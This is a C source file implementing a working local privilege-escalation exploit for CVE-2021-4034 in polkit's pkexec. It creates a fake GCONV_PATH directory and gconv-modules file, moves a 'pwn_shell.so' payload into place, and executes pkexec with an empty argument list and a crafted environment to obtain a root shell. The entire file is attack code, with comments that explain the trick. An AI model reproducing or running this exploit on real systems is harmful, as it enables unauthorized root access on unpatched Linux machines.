#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
    puts("************** CVE-2021-4034 **************");
    // Using GCONV_PATH & CHARSET flaw
    // setting argc==0 so that out of bound read & write will be done with the GCONV_PATH=./<filename>
    char *args[] = { NULL };

    char *envp[] = {
        "hacker",
        "PATH=GCONV_PATH=.",
        // SHELL ENV value doesn't matter, our original payload is in the Share Object
        "SHELL=it_can_be_any_junk_value_doesnt_matter",
        // CHARSET should be same in gconv-modules 
        "CHARSET=PWNED",
        NULL
    };
    // GCONV_PATH ENV created for placing inside OOB
	system("mkdir GCONV_PATH=. ; touch GCONV_PATH=./hacker ; chmod a+x GCONV_PATH=./hacker");
	system("mkdir hacker ; echo 'module\tUTF-8//\t\t\tPWNED//\t\t\tpwn_shell 2' > hacker/gconv-modules; mv pwn_shell.so hacker/");
	puts("-------------------------------------------");
    puts("***** Successfully exploited to #Root *****");
    puts("-------------------------------------------");
    execve("/usr/bin/pkexec", args, envp);
}
